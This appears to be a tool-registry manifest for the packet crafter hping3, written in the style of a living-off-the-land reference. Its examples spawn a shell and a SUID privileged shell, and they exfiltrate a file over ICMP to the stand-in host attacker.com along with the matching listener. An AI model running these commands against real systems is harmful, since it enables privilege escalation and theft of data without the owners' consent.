---
id: network-hping3
namespace: network:craft:hping3
name: hping3
description: Packet crafting and network analysis tool that can spawn shells and exfiltrate data over ICMP.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
  - network.transfer.upload
  - network.craft.packet
  - network.scan.port
platforms:
  - linux
  - cross-platform
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - nmap
  - nping
artifacts:
  - type: network.packet.capture
    description: Crafted network packets
    mime: application/octet-stream
    trust_level: community
workflow_edges:
  produces:
    - shell-access
    - exfiltrated-data
  consumes:
    - target-ip
contract:
  inputs:
    - type: network.target.ip
      description: Target IP address
  outputs:
    - type: process.output
      description: Shell output
  side_effects:
    - network_traffic
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 8
    network: high
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 8
  network: high
  disk_io: low
allowed-tools:
  - hping3
  - Bash
  - execFile
parameters:
  - name: icmp
    type: string
    required: false
    description: "Send ICMP packets"
    aliases:
      - --icmp
  - name: data
    type: integer
    required: false
    description: "Data size"
    aliases:
      - --data
  - name: sign
    type: string
    required: false
    description: "Signature for ICMP"
    aliases:
      - --sign
  - name: file
    type: file
    required: false
    description: "File to transfer"
    aliases:
      - --file
  - name: listen
    type: string
    required: false
    description: "Listen mode"
    aliases:
      - --listen
  - name: dump
    type: string
    required: false
    description: "Dump received data"
    aliases:
      - --dump
features:
  - network-intensive
  - process-manip
execution:
  template: "hping3 {icmp} {data} {sign} {file} {listen} {dump}"
  sandbox: execFile
  timeout_seconds: 60
  shell: false
global_vars:
  target: ip
examples:
  - description: Spawn interactive shell via hping3 interactive mode
    command: |-
      hping3
      /bin/sh
  - description: Spawn privileged shell with SUID
    command: |-
      hping3
      /bin/sh -p
  - description: Exfiltrate file via ICMP covert channel
    command: hping3 attacker.com --icmp --data 999 --sign xxx --file /path/to/input-file
  - description: Receive exfiltrated file on attacker side
    command: hping3 --icmp --listen xxx --dump
references:
  - label: "hping3 man page"
    url: "https://man7.org/linux/man-pages/man8/hping3.8.html"
techniques:
  - privilege-escalation
  - exfiltration
  - execution
install:
    - method: apt
      package_name: "hping3"
      commands:
        - "apt-get install -y hping3"
---


# hping3 — Packet Crafting Tool

hping3 is a command-line TCP/IP packet crafting tool. In interactive mode, it can spawn a shell by typing `/bin/sh`. It can also exfiltrate files over ICMP as a covert channel.
